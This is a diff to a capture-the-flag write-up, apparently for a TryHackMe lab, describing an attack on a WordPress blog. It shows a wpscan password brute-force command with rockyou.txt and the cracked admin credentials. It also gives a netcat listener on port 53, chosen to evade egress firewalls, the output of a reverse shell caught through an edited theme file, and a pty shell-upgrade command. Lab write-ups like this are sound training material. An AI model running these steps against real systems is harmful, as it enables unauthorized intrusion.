@@ -73,11 +73,11 @@ Task Completed
 - Under the directory `http://internal.thm/blog/wp-login.php` we have a login page for `wordpress`
 
 ![alt text](images/internal_WP-LOGIN-SS.png)
-- Basic enumeration on the page with the login credentials using `admin:admin` can see that there is a user called admin
+- Basic enumeration on the page with the login credentials using `admin:admin` can see that there is a active user called admin
 
 ![alt text](images/WP-ADMIN-SS.png)
 
-- With this information lets try and run a `wpscan` to find the password
+- With this information I can try and run a `wpscan` to find the password
 - `wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords rockyou.txt -t 100`
 - **wpscan Scan Results:**
 ```
@@ -97,7 +97,7 @@ Task Completed
 ```
 
 ```
-We are able to find that the login credentials are Username: admin, Password: my2boys
+I was able to find that the login credentials are Username: admin, Password: my2boys
 ```
 
 ## Gaining Access To The Machine:
@@ -110,3 +110,17 @@ We are able to find that the login credentials are Username: admin, Password: my
 
 - In my terminal I have the following listener setup: `rlwrap nc -lvnp 53`
 - I'm listing on port `53` as it is commonly unblocked on outgoing firewalls
+
+- Now when I go to `http://internal.thm/blog/wp-content/themes/twentyseventeen/archive.php` active reverse shell on the machine
+```
+listening on [any] 53 ...
+connect to [10.2.17.217] from (UNKNOWN) [10.10.103.219] 41522
+Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 02:11:39 up  1:27,  0 users,  load average: 0.00, 0.02, 0.60
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+- I upgraded my shell using this python command `python -c 'import pty;pty.spawn("/bin/bash")';`
